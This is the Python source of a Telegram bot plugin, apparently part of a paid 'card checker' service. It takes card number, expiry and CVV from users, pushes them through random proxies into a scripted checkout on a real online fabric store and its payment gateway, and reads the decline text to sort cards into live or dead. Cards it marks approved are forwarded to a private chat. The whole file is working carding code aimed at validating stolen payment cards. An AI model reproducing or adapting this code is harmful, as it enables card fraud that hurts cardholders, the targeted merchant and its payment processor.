import json
import base64
import requests
from Plugins.SegundoPlano.antispam import *
from parse import parseX
import check_template
import names
import re
import AdyenEncrypt
import uuid
import parser_kurama
import time
import random
from func_bin import get_bin_info
from Plugins.Func import connect_to_db
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from requests.exceptions import ProxyError, ConnectionError

max_retries = 3
retry_delay = 3

proxiess = "proxys.txt"

keyboard = InlineKeyboardMarkup(
    [
        [InlineKeyboardButton("Premium for only $3", url="https://t.me/RefeDarwinScrapper/9175")]
    ]
)

def generar_codigo_session():
    codigo_session = str(uuid.uuid4())
    return codigo_session

COMMAND_STATUS_FILE = "command_status.txt"

def is_command_enabled(command_name):
    with open(COMMAND_STATUS_FILE, "r") as f:
        command_status = f.read().splitlines()
    for line in command_status:
        name, status = line.split(":")
        if name == command_name:
            return status == "on"
    return False


name_gate = "ConvergePay"
subtype = "$15"
command = "pay"

@Client.on_message(filters.command([f"{command}"], prefixes=['.', '/', '!', '?'], case_sensitive=False) & filters.text)
def braintree1(client, message, command=command):
    if not is_command_enabled(f"{command}"):
            return message.reply(f""" <a href='https://imgur.com/ihpUqrG.jpg'>&#8203;</a> 
━━━━━✧𝑲𝒖𝒓𝒂𝒎𝒂𝑪𝒉𝒌✧━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] STATUS ↯ <code>MANTENIMIENTO | OFF ❌</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] GATEWAY ↯  <code>{name_gate}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] SUBTYPE ↯  <code>{subtype}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] USE ↯ <code>PREMIUM PLAN</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] VERSIÓN ↯ 6.0
━━━━━━━━━✧♛✧━━━━━━━━  </b> """, reply_markup=keyboard)
    username = message.from_user.username
    chat_id = message.chat.id
    user_id = message.from_user.id
    command = command
    ID = message.from_user.id
    FIRST = message.from_user.first_name
    spam_message = antispam(user_id, command, message)
    if spam_message is not None:
        message.reply(spam_message)
        return        
            #--------- VERIFICACION DE BIN BANEADOS ----------#
    
    ccs = message.text[len(f"/{command} "):]  
    reply = message.reply_to_message
    
    
    
    try:
        if not ccs:
            reply = message.reply_to_message
            texto = reply.text[:6]
        else:
            texto = ccs[:6]
    
        
    
        with open('binban.txt', 'r') as file:
            bins_baneados = file.readlines()
        
        for bin_baneado in bins_baneados:
            if texto.startswith(bin_baneado.strip()[:6]):
                message.reply('⚠️Error: Banned BIN. Please try another method.⚠️')
                return
            
    except:
        pass
        
    
    try:
    
        with open('binban.txt', 'r') as file:
            bins_baneados = file.readlines()
        
        for bin_baneado in bins_baneados:
            if texto.startswith(bin_baneado.strip()[:6]):
                message.reply('⚠️Error: Banned BIN. Please try another method.⚠️')
                return
        
    except:
        pass
            
    conn = connect_to_db()
    cursor = conn.cursor()
    user_id = message.from_user.id
    username = message.from_user.username  
    
    cursor.execute('SELECT rango, creditos, antispam, dias FROM users WHERE user_id = ?', (user_id,))
    user_data = cursor.fetchone()
    if not user_data:
                return message.reply(f"<b>First, you must register. /register .</b> ")
            
    if user_data[0] in ["Baneado", "baneado"]:
        return message.reply(f"<b>You are not allowed to use the \nReason: Banned bot❌. </b> ")
           
    chat_id2 = message.chat.id
    chat_data = cursor.execute('SELECT rango FROM users WHERE user_id = ?', (chat_id2,))
    chat_data = cursor.fetchone()
    
    if chat_data is None:
        chat_data = "Free"
        
        
           
    if all(role not in user_data[0] for role in ["Premium", "Seller", "Owner"]) and all(role not in chat_data[0] for role in ["Staff", "Staff"]):
            return message.reply(f"<b>The chat is not authorized to use this command. Contact admin @Crypto_locker5 ❌</b> <a href='https://imgur.com/ihpUqrG.jpg'>&#8203;</a>", reply_markup=keyboard)
        
    
  
    ccs = message.text[len(f"/{command} "):]  
                  
      
    reply = message.reply_to_message
            
    if not ccs:
        if not reply or not reply.text:
            return message.reply(f"""<b>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] 𝑲𝒖𝒓𝒂𝒎𝒂 𝑪𝒉𝒌
━━━━━━━━━━━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Gateway ↯ <code>{name_gate}</code>   
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Subtype ↯ <code>{subtype}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Use ↯ <code>${command} cc|month|year|cvv</code>
━━━━━━━━━━━━━━━━
</b>""", reply_markup=keyboard, disable_web_page_preview=True)
     

        ccs = reply.text
        

    result = parser_kurama.parseData(ccs)
    x = get_bin_info(ccs[:6])

    if 'error' in result:
        return message.reply(f"""<b> 
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] 𝑲𝒖𝒓𝒂𝒎𝒂 𝑪𝒉𝒌
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Gateway ↯ <code>{name_gate} {subtype}</code>   
━━━━━━━━━━━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] CC ↯ <code>{ccs}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Status ↯ <b>DECLINED ❌</b>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Result ↯ Card Invalid!
━━━━━━━━━━━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Bin ↯ <code>{x.get("type")}</code> | <code>{x.get("level")}</code> | <code>{x.get("vendor")}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Country ↯ <code>{x.get("country")} {x.get("flag")}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Bank ↯ <code>{x.get("bank_name")}</code>
━━━━━━━━━━━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Checked by ↯ @{username} [{user_data[0]}]
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Bot by ↯ @Crypto_locker5

</b>""", reply_markup=keyboard, disable_web_page_preview=True)
            
        
    ccnum = result['ccnum']
    mes = result['month']
    ano = result['year']
    if len(ano) == 2:
        ano = '20'+result['year']
    cvv = result['cvv']
    ccs = f"{ccnum}|{mes}|{ano}|{cvv}"
    
    
    req = requests.get(f"https://bins.antipublic.cc/bins/{ccnum[:6]}").json()      
    brand = req['brand']
    CorreoRand = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}@gmail.com"
    x = get_bin_info(ccnum[:6])
        
    #---------- PLANTILLA DE CARGA #1 ------------#
    loading_message = message.reply(f"""<b>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] 𝑲𝒖𝒓𝒂𝒎𝒂 𝑪𝒉𝒌
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Gateway ↯ <code>{name_gate} {subtype}</code>   
━━━━━━━━━━━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] CC ↯ <code>{ccs}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Status ↯ <b>Loading...</b> 
━━━━━━━━━━━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Bin ↯ <code>{x.get("type")}</code> | <code>{x.get("level")}</code> | <code>{x.get("vendor")}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Country ↯ <code>{x.get("country")} {x.get("flag")}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Bank ↯ <code>{x.get("bank_name")}</code>
━━━━━━━━━━━━━━━━  </b>""", reply_markup=keyboard, disable_web_page_preview=True)
    
    SessionId = generar_codigo_session()
    session = requests.Session()
    
    with open(proxiess, 'r') as file:
        proxies_1 = file.read().splitlines()
            
        session = requests.Session()
        proxie = random.choice(proxies_1)

        session.proxies = {
        'https': f'{proxie}'}
    
    inicio = time.time()

    #------------------- #1 Requests -------------------#
    try:
        headers = {
            'authority': 'www.reproductionfabrics.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            # 'cookie': 'PHPSESSID=e3b8e19d80b4b02d7b9149b01fd09af2; __utma=77889431.680939860.1710758863.1710758863.1710758863.1; __utmc=77889431; __utmz=77889431.1710758863.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmt=1; __utmb=77889431.2.10.1710758863',
            'origin': 'https://www.reproductionfabrics.com',
            'referer': 'https://www.reproductionfabrics.com/lines.php?subcat=1399',
            'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
        }

        data = {
            'qty': '1',
            'skuid': '29296',
            'sku': 'QR912D',
            'returnto': 'QR912D',
        }

        response = session.post('https://www.reproductionfabrics.com/cart/addtocart.php', headers=headers, data=data).text

        headers = {
            'authority': 'www.reproductionfabrics.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            # 'cookie': 'PHPSESSID=e3b8e19d80b4b02d7b9149b01fd09af2; __utma=77889431.680939860.1710758863.1710758863.1710758863.1; __utmc=77889431; __utmz=77889431.1710758863.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmt=1; __utmb=77889431.3.10.1710758863',
            'origin': 'https://www.reproductionfabrics.com',
            'referer': 'https://www.reproductionfabrics.com/cart/viewcart.php?sf=1',
            'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
        }

        data = {
            'returnto': 'https://www.reproductionfabrics.com/lines.php?subcat=1399',
            'show_db_1': '1',
            #'skuid_1': '29296',
            'qty_1': '1',
            'oldqty_1': '1',
            'cart_count': '1',
            'action': 'Checkout',
        }

        response = session.post(
            'https://www.reproductionfabrics.com/cart/viewcart_process.php',
            headers=headers,
            data=data,
        )
        
        url = str(response.url)
        
        id_ = url.split("=")[1]
            
        headers = {
            'authority': 'www.reproductionfabrics.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            # 'cookie': 'PHPSESSID=e3b8e19d80b4b02d7b9149b01fd09af2; __utma=77889431.680939860.1710758863.1710758863.1710758863.1; __utmc=77889431; __utmz=77889431.1710758863.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmt=1; __utmb=77889431.3.10.1710758863',
            'origin': 'https://www.reproductionfabrics.com',
            'referer': 'https://www.reproductionfabrics.com/cart/checkout1.php?id=86005',
            'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
        }

        data = {
            'id': id_,
            'first_name': 'Juan',
            'last_name': 'Smith',
            'ship_address': 'Street 16th av billonarie',
            'ship_address_2': '',
            'ship_city': 'New York',
            'ship_state': 'New York',
            'ship_zip': '10080',
            'ship_country_id': '1',
            'other_country': '',
            'use_other_country': '0',
            'ship_phone': '3054647463',
            'email': 'ivorycharisse@awgarstone.com',
            'promo_code': '',
            'use_shipping': '1',
            'market': 'Quilting',
            'action': 'Continue checkout',
        }

        response = session.post('https://www.reproductionfabrics.com/cart/checkout2.php',  headers=headers, data=data)
        
        headers = {
            'authority': 'www.reproductionfabrics.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            # 'cookie': 'PHPSESSID=e3b8e19d80b4b02d7b9149b01fd09af2; __utma=77889431.680939860.1710758863.1710758863.1710758863.1; __utmc=77889431; __utmz=77889431.1710758863.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmb=77889431.3.10.1710758863',
            'origin': 'https://www.reproductionfabrics.com',
            'referer': 'https://www.reproductionfabrics.com/cart/checkout2.php',
            'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
        }

        data = {
            'id': id_,
            'shipper_id': '0',
            'ship_desc0': 'USA -- Standard Shipping (3-7 Business days)',
            'ship_cost0': '8.50',
            'ship_desc1': 'USA -- UPS <b>2nd Day Air </b>(2 business days)',
            'ship_cost1': '35.00',
            'action': 'Continue checkout',
        }

        response = session.post('https://www.reproductionfabrics.com/cart/checkout3.php', headers=headers, data=data)
        
        headers = {
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://www.reproductionfabrics.com',
            'Referer': 'https://www.reproductionfabrics.com/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'cross-site',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        data = {
            'tokenizationKey': 'x2vAv5-BGVwUu-Rg85K3-7FDsR2',
            'cartCorrelationId': '',
        }

        response = session.post('https://remsolutions.transactiongateway.com/token/api/create', headers=headers, data=data).json()
        token = response.get("token")
        
        headers = {
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5',
            'Connection': 'keep-alive',
            'Content-type': 'application/json;charset=UTF-8',
            'Origin': 'https://remsolutions.transactiongateway.com',
            #'Referer': 'https://remsolutions.transactiongateway.com/token/inline.php?tokenizationKey=x2vAv5-BGVwUu-Rg85K3-7FDsR2&cartCorrelationId=&token=YG832R5G-67n2QX-rr2bc6-5G5PX5dk4BsG&elementId=cvv&title=CVV%20Code&placeholder=CVV&cvvDisplay=required',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        json_data = {
            'tokenizationKey': 'x2vAv5-BGVwUu-Rg85K3-7FDsR2',
            'cartCorrelationId': '',
            'tokenId': token,
            'data': [
                {
                    'elementId': 'cvv',
                    'cvvDisplay': True,
                    'value': cvv,
                },
            ],
        }

        response = session.post(
            'https://remsolutions.transactiongateway.com/token/api/save_multipart_token',
            headers=headers,
            json=json_data,
        )
        
        
        headers = {
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5',
            'Connection': 'keep-alive',
            'Content-type': 'application/json;charset=UTF-8',
            'Origin': 'https://remsolutions.transactiongateway.com',
            #'Referer': 'https://remsolutions.transactiongateway.com/token/inline.php?tokenizationKey=x2vAv5-BGVwUu-Rg85K3-7FDsR2&cartCorrelationId=&token=YG832R5G-67n2QX-rr2bc6-5G5PX5dk4BsG&elementId=ccnumber&title=Card%20Number&placeholder=Card%20Number&enableCardBrandPreviews=false',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        json_data = {
            'tokenizationKey': 'x2vAv5-BGVwUu-Rg85K3-7FDsR2',
            'cartCorrelationId': '',
            'tokenId': token,
            'data': [
                {
                    'elementId': 'ccnumber',
                    'value': ccnum,
                },
            ],
        }

        response = session.post(
            'https://remsolutions.transactiongateway.com/token/api/save_multipart_token',
            headers=headers,
            json=json_data,
        )
        headers = {
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5',
            'Connection': 'keep-alive',
            'Content-type': 'application/json;charset=UTF-8',
            'Origin': 'https://remsolutions.transactiongateway.com',
            'Referer': 'https://remsolutions.transactiongateway.com/token/inline.php?tokenizationKey=x2vAv5-BGVwUu-Rg85K3-7FDsR2&cartCorrelationId=&token=YG832R5G-67n2QX-rr2bc6-5G5PX5dk4BsG&elementId=ccexp&title=Card%20Expiration&placeholder=MM%2FYY',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        json_data = {
            'tokenizationKey': 'x2vAv5-BGVwUu-Rg85K3-7FDsR2',
            'cartCorrelationId': '',
            'tokenId': token,
            'data': [
                {
                    'elementId': 'ccexp',
                    'value': f'{mes}{ano}',
                },
            ],
        }

        response = session.post(
            'https://remsolutions.transactiongateway.com/token/api/save_multipart_token',
            headers=headers,
            json=json_data,
        )
        
        headers = {
            'authority': 'www.reproductionfabrics.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5',
            'cache-control': 'max-age=0',
            #'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryCXjZbcXFBFBWwCS6',
            # 'cookie': 'PHPSESSID=e3b8e19d80b4b02d7b9149b01fd09af2; __utma=77889431.680939860.1710758863.1710758863.1710758863.1; __utmc=77889431; __utmz=77889431.1710758863.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmb=77889431.3.10.1710758863',
            'origin': 'https://www.reproductionfabrics.com',
            'referer': f'https://www.reproductionfabrics.com/cart/checkout4.php?id={id_}&upd=1',
            'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
        }

        files = {
            'id': (None, id_),
            'payment_token': (None, token),
            'payment_token_card_number': (None, f'{ccnum[:6]}******{ccnum[12:16]}'),
            'payment_token_card_expiration': (None, f'{mes}/{ano}'),
            'payment_token_card_type': (None, brand),
            'cc_name': (None, 'Juan Smith'),
            'tax_status': (None, 'N/A'),
            'tax_notes': (None, 'Not Applicable'),
            'tax_exempt_certificate': (None, ''),
            'tax_exempt_certificate_new': ('', '', 'application/octet-stream'),
            'action': (None, 'Continue checkout'),
        }

        response = session.post('https://www.reproductionfabrics.com/cart/checkout5.php', headers=headers, files=files)

        headers = {
            'authority': 'www.reproductionfabrics.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            # 'cookie': 'PHPSESSID=e3b8e19d80b4b02d7b9149b01fd09af2; __utma=77889431.680939860.1710758863.1710758863.1710758863.1; __utmc=77889431; __utmz=77889431.1710758863.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)',
            'origin': 'https://www.reproductionfabrics.com',
            'referer': 'https://www.reproductionfabrics.com/cart/checkout5.php',
            'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
        }

        data = {
            'id': id_,
            'notes': '',
            'total': '20',
            'tax': '0',
            'action': 'Submit Order',
        }

        response = session.post('https://www.reproductionfabrics.com/cart/checkout6.php',  headers=headers, data=data).text
        code = parseX(response, '<div class="error-list mt-1 fs-2">', '</div>')


        if "DECLINED: NSF" in code:
            msg = "APPROVED CVV✅"
            respuesta = "DECLINED: NSF"
            
            
        elif "DECLINED CVV2" in code:
            msg = "APPROVED CCN✅"
            respuesta = "DECLINED CVV2"

        else:
            msg = "DECLINED ❌"
            respuesta = code 
    except:
        msg = "DECLINED ❌"
        respuesta = "Ha ocurrido un error"
    
    proxyy = "LIVE 🟩"
    gateway = f'<code>{name_gate} {subtype}</code>'
    end = time.time()
    tiempo = str(inicio - end)[1:5]
    session.close()  
    if "APPROVED" in msg:
        
        chat_id = -1002000802973
    
        client.send_message(chat_id, check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy))
        
    return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)
    
    